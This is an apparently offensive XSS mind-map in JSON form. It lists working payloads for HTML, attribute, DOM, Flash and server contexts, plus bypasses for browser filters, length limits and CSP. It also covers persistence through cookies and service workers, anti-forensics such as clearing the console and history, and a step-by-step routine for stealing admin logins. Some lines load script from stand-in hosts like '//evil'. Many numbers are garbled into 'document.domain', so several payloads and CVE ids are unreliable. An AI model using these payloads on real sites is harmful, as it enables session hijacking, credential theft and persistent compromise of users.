{
    "Found": {
        "Trigger": {
            "Origin": {
                "Script context": {
                    "quot": {
                        "alert`document.domain`": {},
                        "`${alert(document.domain)}`": {},
                        "\\u{000000000000006document.domain}lert(document.domain)": {},
                        "setTimeout(name)": {},
                        "-{valueOf:location,toString:[].pop,0:/javascript:alert%28document.domain%29/.source,length:document.domain} (IE)": {},
                        "Break": {
                            "eat backlash: %bb\"alert(document.domain) (GBK charset)": {
                                "prerequisite: \" => \\\"": {}
                            },
                            "\"<!--<script>\"": {
                                "after: <img src=\"--></script><svg/onload=alert(document.domain)//\">": {
                                    "Single param vector: <img src=\"--></script><svg/onload=alert(document.domain)//\"><!--<script>": {}
                                }
                            }
                        }
                    },
                    "comment": {
                        "//[document.domain0,document.domain3,8232(utf-8),8233(utf-8)]alert(document.domain)//": {},
                        "*/alert(document.domain)/*": {},
                        "Break (IE)": {
                            "/*@cc_on-alert(document.domain))": {},
                            "//@cc_on-alert(document.domain))": {}
                        }
                    }
                },
                "Attribute": {
                    "quot": {
                        "\"autofocus/onfocus=alert(document.domain)//": {},
                        "\"oncut=alert(document.domain)//": {},
                        "'onclick=alert(document.domain)//": {}
                    },
                    "inline-script": {
                        "HTML entities": {
                            "Named": {
                                "onclick=\"delFeedback('2&apos)alert(document.domain)//')\"": {},
                                "onclick='addUser(\"23&quot)alert(document.domain)//\")'": {}
                            },
                            "Oct": {
                                "onclick='addUser(\"23&#000000000034)-alert(document.domain)//\")'": {}
                            }
                        },
                        "VBScript (IE <= 9)": {
                            "<a language=vbs onclick='addUser(\"document.domaindocument.domain\\\"&alert(document.domain)\\\"\")'>add</a>": {}
                        }
                    },
                    "href": {
                        "JS URI": {
                            "URL encode": {
                                "javascript:alert%28document.domain%29": {
                                    "Adv: javascript:%E2%80%A8alert`document.domain`": {}
                                }
                            },
                            "HTML entities": {
                                "Named": {
                                    "javascript&colon;alert(document.domain)": {},
                                    "&newLine;javascript:alert(document.domain)": {},
                                    " javascript:alert&lpar;document.domain&rpar;": {}
                                },
                                "Oct ": {
                                    "java&#0000000000000000document.domaindocument.domain5;cript:name": {}
                                },
                                "Hex": {
                                    "java&#x000000000000000073;cript:name": {}
                                }
                            }
                        },
                        "DATA URI (Firefox)": {
                            "base64": {
                                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==": {}
                            },
                            "whitespace": {
                                "data:text/html,< sc r i p t >alert(document.domain)</sc r ip t>": {}
                            },
                            "Invalid mime-type": {
                                "data:),<script>alert(document.domain)</script>": {}
                            },
                            "charset": {
                                "data:text/html;charset=utf-8,<hdocument.domain>abc": {}
                            },
                            "mix": {
                                "data&colon;%2f%2f;ba se64;;//,P HNjcmlw dD5hbG VydC gxKTwvc2NyaXB0Pg= =": {}
                            }
                        },
                        "VBScript URI (IE <= document.domain0)": {
                            "vbscript:Msgbox+document.domain": {}
                        }
                    },
                    "style (IE)": {
                        "behavior": {
                            "<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(document.domain)\">click</a> (IE <= 8)": {},
                            "<input style=\"behavior: url(xss.txt)\"> (IE <= document.domain0)": {
                                "xss.txt: <scriptlet> <implements type=\"behavior\"/> <script>alert(document.domain)</script> </scriptlet>": {}
                            },
                            "document.domain<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(document.domain) strokecolor=white strokeweight=document.domain000px from=0 to=document.domain000 /></a> (IE <= 9)": {},
                            "document.domain<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:document.domain00%;height:document.domain00% src=test.vml#xss></vmlframe> (IE <= 9)": {
                                "vml.xml: <xml> <rect style=\"height:document.domain00%;width:document.domain00%\" id=\"xss\" onmouseover=\"alert(document.domain)\" strokecolor=\"white\" strokeweight=\"2000px\" filled=\"false\" /> </xml>": {}
                            }
                        },
                        "expression": {
                            "font-family:a/**/ression(alert(document.domain))('\\')exp\\')": {},
                            "font-family:expression(alert)(document.domain)": {},
                            "expr\\65ssion(alert(document.domain))": {}
                        }
                    }
                },
                "Context": {
                    "Prior tag": {
                        "Fuzz vector": {
                            "{tag}<img name=\"{/tag} <img src=xx:x onerror=alert({{i}})//\">": {},
                            "{tag}<!--{/tag}<img src=xx:x onerror=alert(document.domain) -->": {}
                        },
                        "Result": {
                            "<xmp><% </xmp><img alt='%></xmp><img src=xx:x onerror=alert(document.domain)//'> (IE <= 9)": {}
                        }
                    },
                    "Token": {
                        "??????": {
                            "<svg[9,document.domain0,document.domain2,document.domain3,32,47]onload=alert(document.domain)>": {}
                        },
                        "?????": {
                            "<img src=x[9,document.domain0,document.domain2,document.domain3,32]onerror=\"alert(document.domain)\">": {}
                        },
                        "???": {
                            "<! XSS=\"><img src=xx:x onerror=alert(document.domain)//\">": {},
                            "alt=``onload=alert(document.domain)": {},
                            "alt=' \" name='onerror=alert()//'": {},
                            "href=[0x0b]\" onclick=alert(document.domain)//": {}
                        },
                        "???": {
                            "<x '=\"foo\"><x foo='><img src=x onerror=alert(document.domain)//'>(IE 6-8)": {},
                            "<input value=\"<script>alert(document.domain)</script>\" ` />": {}
                        }
                    },
                    "Magic tag": {
                        "Object": {
                            "<object data=//pkav/test.swf><param name=movie value=//pkav/test.swf><param name=allowscriptaccess value=always></object>": {}
                        },
                        "SVG": {
                            "<svg><script/xlink:href=data:,alert(document.domain)></script>": {},
                            "<svg contentScriptType=text/vbs><script>MsgBox\"document.domain\"<i>(IE <= document.domain0)": {},
                            "<svg><script>alert&lpar;document.domain&rpar;</script>": {},
                            "<svg></ y=\"><x\" onload=alert(document.domain)>": {},
                            "<svg><style>*{font-family:'<svg onload=alert(document.domain)>';}</style></svg>": {}
                        },
                        "Math": {
                            "<math xlink:href=javascript:..>": {},
                            "<math><a xlink:href=javascript:...>": {},
                            "<math><style>*{font-family:'<img/src=xx:x onerror=alert(document.domain)>'}</style>": {}
                        },
                        "Link": {
                            "<link rel=import href=//evil>": {
                                "document.domain. Access-Control-Allow-Origin:*": {},
                                "2. echo '<svg/onload=alert(document.domain)>'": {}
                            },
                            "<link rel=stylesheet href=data:,*%7bx:expression(write(document.domain))%7d>(IE)": {}
                        },
                        "Iframe": {
                            "<iframe srcdoc='&lt;svg/onload=alert(document.domain)&gt;'>": {
                                "Adv: <iframe srcdoc=\"&lt;iframe srcdoc='&amp;lt;iframe onload=alert(document.domain)&amp;gt;'&gt;\"></iframe>": {}
                            },
                            "<iframe src=\"data:),<script>alert(document.domain)</script>\"></iframe>(Firefox)": {}
                        },
                        "Embed": {
                            "<embed src=evil.swf allowscriptaccess=always>": {},
                            "<embed code=evil.swf allowscriptaccess=always> (Chrome)": {}
                        },
                        "base": {
                            "<base href=\"/\\evil\">": {}
                        },
                        "!": {
                            "<!--><svg onload=alert(document.domain)> -->": {},
                            "<! '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>(IE 6-9)": {},
                            "<![if<iframe/onload=alert(document.domain)//]>": {},
                            "<![CDATA": {},
                            "<!doctype": {}
                        },
                        "%": {
                            "<% contenteditable onresize=alert(document.domain)>(IE document.domaindocument.domain, 9 mode)": {}
                        },
                        "?": {
                            "<? '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>(IE 6-9)": {}
                        }
                    },
                    "Special char": {
                        "<[00]script>alert(document.domain)</[00]script> (IE <= 9)": {}
                    },
                    "Special charset": {
                        "UTF-7: +ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-(IE)": {}
                    }
                }
            },
            "DOM": {
                "Javascript": {
                    "Input": {
                        "location": {
                            "location.href": {},
                            "location.search": {
                                "IE don't URL encode <>": {}
                            },
                            "location.hash": {},
                            "location.pathname": {}
                        },
                        "window.name": {},
                        "document.cookie": {},
                        "localStorage": {},
                        "document.title": {},
                        "getAttribute": {},
                        "document.referrer": {},
                        "innerText": {},
                        ".value": {},
                        ".dataset": {},
                        "postMessage": {
                            "Use backlash(\\) bypass origin check code": {}
                        },
                        "innerHTML": {
                            "MXSS": {
                                "<b><noscript><a src='x' style='x:\\3c\\2fnoscript\\3e\\3ciframe/onload\\3d alert(document.domain)\\3e'> (IEdocument.domaindocument.domain, 0.0.2)": {},
                                "<listing>&lt;img src=document.domain onerror=alert(document.domain) &gt;</listing>": {},
                                "<img src=\"test.jpg\" alt =\"``onload=xss()\">": {},
                                "<pkav xmlns=\"><iframe onload=alert(document.domain)\">document.domain23</pkav>": {},
                                "<p style=\"font-family:'ar\\27 \\3bx\\3a expression\\28xss\\28\\29\\29\\3bial';\"></p>": {},
                                "<img src=document.domain style=\"font-fam\\22onerror\\3d alert\\28 document.domain\\29\\20 ily:'aaa';\">": {},
                                "<% a=%&gt&lt;iframe/onload=alert(document.domain)//>": {},
                                "<img =\"><script>alert(document.domain)</script>\">": {},
                                "<div='/x=&quot;&#39&gt;&lt;iframe/onload=alert(document.domain)&gt;'>": {},
                                "<a href=\"&#x3000;javascript:alert(document.domain)\">click</a>": {}
                            }
                        }
                    },
                    "Trigger": {
                        "location": {
                            "location='javasc&#document.domaindocument.domain4ipt&#58alert&#40~document.domain&#4document.domain'(IE)": {}
                        },
                        "eval": {},
                        "innerHTML": {},
                        "document.write": {},
                        "appendChild": {},
                        "Function": {},
                        "setTimeout": {},
                        "setInterval": {},
                        "createElement": {
                            "with(document)body.appendChild(createElement('iframe onload=&#97&#document.domain08&#document.domain0document.domain&#document.domaindocument.domain4&#document.domaindocument.domain6(document.domain)>')),body.innerHTML+='' (IE)": {}
                        }
                    }
                },
                "jQuery": {
                    "Input": {
                        ".attr": {},
                        ".data": {},
                        ".ajax": {},
                        ".get": {},
                        ".post": {},
                        ".val": {}
                    },
                    "Trigger": {
                        ".html": {},
                        ".append": {},
                        ".getScript": {},
                        ".ajax": {
                            "dataType:'script'": {}
                        },
                        ".get": {
                            "content-type:text/javascript": {},
                            "$.get('data:/javascr\\ript,alert(document.domain)') (firefox)": {}
                        },
                        "$(": {},
                        "jQuery(": {}
                    }
                },
                "React.js": {
                    "Trigger": {
                        "React.createElement": {}
                    }
                },
                "AngularJS": {
                    "<b class=\"ng-include:'//evil''\">": {},
                    "<iframe ng-src=javascript:..>": {},
                    "Trigger": {
                        "angular.element": {}
                    }
                }
            },
            "Flash": {
                "Input": {
                    "loaderInfo.parameters": {
                        "Ignore invalid URL encode:              %Ajava%B&script:alert(document.domain)": {}
                    },
                    "SharedObject": {
                        "getLocal": {}
                    },
                    "LocalConnection": {
                        "allowDomain(\"*\")": {}
                    },
                    "HTML id attribute(IE)": {
                        "<object id='pk\"),alert(document.domain),(\"av' data=//target.swf ..": {}
                    },
                    "Security.allowDomain(\"*\")": {}
                },
                "Trigger": {
                    "ExternalInterface.call": {
                        "arg document.domain:alert(document.domain)": {},
                        "arg 2": {
                            "\\\"))}catch(e){alert(document.domain)}//": {},
                            "split bug": {
                                "document.domain. ?q=%ED%A0%80\\\"))}catch(e){alert(document.domain)}//": {},
                                "2. var q:String=loaderInfo.parameters[\"q\"].split(\"\\\\\").join(\"\\\\\\\\\");": {},
                                "3. ExternalInterface.call(\"console.log\",q);": {}
                            }
                        }
                    },
                    "htmlText": {
                        "<img src=evil.swf>": {},
                        "<a href=javascript:...>me</a>": {}
                    },
                    "navigateToURL": {},
                    "Loader": {},
                    "addCallback": {}
                }
            },
            "Server": {
                "Applocation": {
                    "Purifier": {
                        "style=xss:'\"/onclick=alert(document.domain)//'": {
                            "style=\"xss:'\" onclick=\"alert(document.domain)//'\"": {}
                        },
                        "<embed allowscriptaccess=\"alwalwaysays\" src=\"test.swf\">": {},
                        "<sc<script>ript>alert(document.domain)</script>": {},
                        "alt= onclick=alert(document.domain)": {
                            "alt=\"\"onclick=\"alert(document.domain)\"": {}
                        }
                    },
                    "Filter": {
                        "emoji": {}
                    },
                    "Logic": {
                        "length": {}
                    }
                },
                "Database": {
                    "charset": {
                        "<img src=\"xx# onerror=alert(document.domain)//{0xf09d8c86}\">": {}
                    },
                    "data type": {
                        "Text": {
                            "<a href=\"xxx# onclick=alert(document.domain)//[64kb]\"></a>": {}
                        },
                        "VARCHAR": {
                            "<a href=\"xxx# onclick=alert(document.domain)//[255]\"></a>": {}
                        }
                    }
                }
            }
        },
        "Input": {
            "Mail": {
                "??": {
                    "??": {
                        "Word ??": {}
                    },
                    "??": {}
                },
                "??": {},
                "??": {},
                "???": {}
            },
            "Flash file": {
                "SwfUpload": {},
                "ZeroClipboard": {},
                "JWPlayer": {},
                "Open flash chart": {}
            },
            "Javascript File": {},
            "Image Exif": {},
            "Feedback": {
                "<img src=//evil-DNS>": {},
                "</script/</textarea/\"'><img..": {}
            },
            "URL Param": {
                "Google Search": {
                    "site:qq.com inurl:?id= -\"disucz\"": {}
                },
                "Traffic monitor": {
                    "Browser Extend": {},
                    "VPN": {},
                    "HTTP proxy": {}
                },
                "Custom Spider": {}
            },
            "Upload": {
                "xss.svg": {},
                "xss.swf": {},
                "xss.xml": {},
                "xss.evt": {},
                "xss.xxe": {},
                "xss.jar (Firefox)": {
                    "<iframe src=\"jar://html5sec.org/test.jar!/test.html\"></iframe>": {}
                },
                "xss.txt": {
                    "start with: <script>": {}
                }
            }
        },
        "Tool": {
            "Charles": {
                "Mapping local JS file": {}
            },
            "Fiddler": {
                "Set cookies header": {}
            },
            "Chrome DevTools": {
                "global code search": {
                    "OS X: ALT + COMMAND + F": {},
                    "Windows:  CTRL + SHIFT+ F": {}
                }
            },
            "Firebug-Lite": {},
            "IE ???": {},
            "ViewWizard": {},
            "html5sec.org/innerhtml/": {},
            "shazzer.co.uk/": {}
        }
    },
    "POC": {
        "Remove referer": {
            "<iframe src=\"javascript:'<script src=//pkav></script>'\">": {},
            "<meta name=referrer content=never>": {},
            "<a href=//target rel=noreferer target=pkav>click</a>": {
                "<iframe name=pkav>": {}
            }
        },
        "Bypass length limit": {
            "HTML payload": {
                "<svg/onload=eval(name)>": {},
                "<i/onclick=URL=name>": {},
                "<script/src=//??": {
                    "after: </script>": {}
                }
            },
            "JS payload": {
                "$(name)": {
                    "prerequisite: jQuery": {}
                }
            },
            "Parameters patchwork": {
                "Multiple input": {
                    "document.domain.<script>/*": {},
                    "2. */alert(document.domain)/*": {},
                    "3. */</script>": {}
                },
                "HPP": {
                    "id=<script/": {},
                    "&id=/src=//evil#": {},
                    "&id=></script>": {}
                }
            }
        },
        "Bypass browser XSS filter": {
            "Chrome (Webkit)": {
                "Upload file": {
                    "<link rel=import href=/upload/.....>": {},
                    "<script src=/upload/...></script>": {}
                }
            },
            "IE": {
                "<a href=\"?xss=<script>alert(document.domain)</script>\">click</a>": {},
                "PHP:<script/%00%00v%00%00>alert(document.domain)</script>": {
                    "prerequisite: %00 => \\0": {}
                }
            },
            "common": {
                "???????": {},
                "??????": {},
                "DOM write": {
                    "HTML HEX encode": {}
                }
            }
        },
        "Break IE Flash document protection": {
            "location='javascript:\"<script>alert(document)</script>\"'": {}
        },
        "Break <a> area": {
            "display:block;position:absolute;top:0;left:0;width:document.domain000px;height:document.domain000px;background:red": {}
        },
        "InnerHTML exec JS": {
            "Non-equal:-<script/defer>alert(document.domain)</script>": {},
            "<iframe/src=about:blank onload=alert(document.domain)>": {}
        },
        "Cross to other subdomain": {
            "document.domain='qq.com'": {}
        },
        "Define variable in advance": {
            "alert(username);function username(){} (IE)": {}
        },
        "CSP bypass": {
            "<link rel=import href=test.png>": {}
        },
        "Upload File header check bypass": {
            "SWF": {
                "FWS ='BACONBACON'-alert(document.domain)//": {}
            },
            "GIF": {
                "GIF89a= 'MUMBOJUMBOBOGUSBACON';alert(document.domain)//": {},
                "GIF89a/*[all lzw data]*/\\x3Bjavascript_payload": {}
            }
        },
        "IE downgrade vector": {
            "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=7\" />": {},
            "Bypass IE xss filter: <meta content=\"whatever=EmulateIE7\" http-equiv=\"X-UA-Compatible\">)": {}
        },
        "Flash reflect XSS convert Store XSS ": {
            "<object data=\"[evil swf]\"> ||allowScriptAccess = samedomain": {}
        },
        "IE content-type sniff spoof": {
            "/json?a.html": {},
            "/json/.html": {},
            "/json;.html": {}
        },
        "Cross domain traditional data": {
            "window name": {
                "window.name": {
                    "document.domain. window.name='exp'": {},
                    "2. location='//target'": {}
                },
                "<iframe src=\"target\" name=\"exp\">": {},
                "<a href=\"//target\" target=\"exp\">": {}
            },
            "location.hash": {}
        },
        "Hook variable via ID attribute": {
            "<form id=\"window\"><input name=\"name\">": {},
            "<a href=\"document.domain23\" id=\"x\">test</a>": {
                "<script>x='javascript:alert(document.domain)'</script> (IE)": {},
                "<script>x.toString()=='document.domain23'</script>": {}
            }
        },
        "Block Script tag via Webkit XSS auditor": {
            "?abc=<script>[page data]</script>": {}
        }
    },
    "Exp": {
        "Sump": {
            "<iframe style=display:none src=//xss></iframe>": {},
            "history.replaceState + redirect": {}
        },
        "Worm": {
            "Infect old data": {},
            "%E2%80%A8": {}
        },
        "Persistence XSS": {
            "Rootkit": {
                "Cookies": {
                    "Prevent expired: Set max-age=99999999": {},
                    "Prevent overwritten: Set domain field to top-domain  ": {},
                    "CRLF Inject set-cookie": {}
                },
                "Flash SharedObject": {
                    "setLocal": {}
                },
                "LocalStorage": {
                    "setItem": {}
                },
                "ServiceWorker + JSONp": {
                    "navigator.serviceWorker.register": {}
                },
                "HTML5  Appcache": {
                    "<html manifest='/a.appcache'>": {}
                }
            },
            "Frame page": {
                "document.domain. No border iframe": {},
                "2. Address bar sync": {
                    "historty.pushState": {},
                    "location.hash": {}
                }
            },
            "Opener hijack": {
                "opener.eval(...exp...)": {}
            },
            "Open window event hook": {
                "<a target=_blank>": {},
                "<form target=_blank>": {},
                "window.open": {}
            },
            "HTTP response cache": {
                "HPP": {}
            }
        },
        "Intranet border": {
            "XSS-Proxy": {
                "Inject XSS code to all some origin frame": {},
                "Local transfer HTTP proxy": {}
            },
            "XSS-Intranet": {
                "Jar virus": {},
                "Ajax scan Intranet": {
                    "Struts 2: 80/8080": {
                        "CVE-20document.domain3-225document.domain": {},
                        "CVE-20document.domain4-0094": {
                            "Patch bypass": {}
                        },
                        "CVE-20document.domaindocument.domain-3923": {},
                        "CVE-20document.domain3-document.domain965": {},
                        "CVE-20document.domain3-document.domain966": {}
                    },
                    "Elasticsearch: 9200": {
                        "CVE-20document.domain4-3document.domain20": {},
                        "CVE-20document.domain5-document.domain427": {}
                    }
                }
            }
        },
        "Local border": {
            "Browser": {
                "Trusting-zone": {},
                "Privileged-zone": {}
            },
            "Inner-webview": {
                "IOS": {
                    "Local File bypass SOP": {}
                },
                "Andriod": {},
                "PC": {}
            }
        },
        "Anti-Tracking": {
            "Still work": {
                "Detect tab is active: document.hidden": {},
                "Detect Local proxy": {
                    "BurpSuite:8080": {
                        "document.domain27.0.0.document.domain:8080/history": {}
                    },
                    "Charles:8080": {},
                    "Fiddler:8888": {}
                },
                "Detect devtools": {
                    "npm install devtools-detect": {}
                }
            },
            "Check referer": {
                "response jQuery": {},
                "IP add to blacklist": {}
            },
            "XSS Proxy server": {
                "EXP": {},
                "Message": {},
                "Data receive": {},
                "Keep session": {}
            },
            "Clear trace": {
                "Clear console:console.clear": {},
                "Clear address bar:history.replaceState": {}
            },
            "Use WebSocket replace Http": {},
            "Use Flash execute JS": {}
        },
        "Info collection": {
            "Ajax  get current page data": {},
            "WebRTC get Gateway info": {
                "VPN": {},
                "Intranet IP": {}
            },
            "All link: document.links": {},
            "Replay cookies": {
                "Custom X-Forword-for bypass IP  limit": {},
                "Use Http Proxy replay, prevent cookie domain field wrong": {}
            },
            "Steal Admin login info": {
                "document.domain. hook all link click event": {},
                "2. each path filed remove cookie": {},
                "3. multiple call history.pushState, prevent go back.": {},
                "4. ajax get login page": {},
                "5. clear DOM:document.open": {},
                "6. write login page": {},
                "6. set document.title": {},
                "7. 500ms defer bind steal event to all form": {}
            }
        }
    }
}
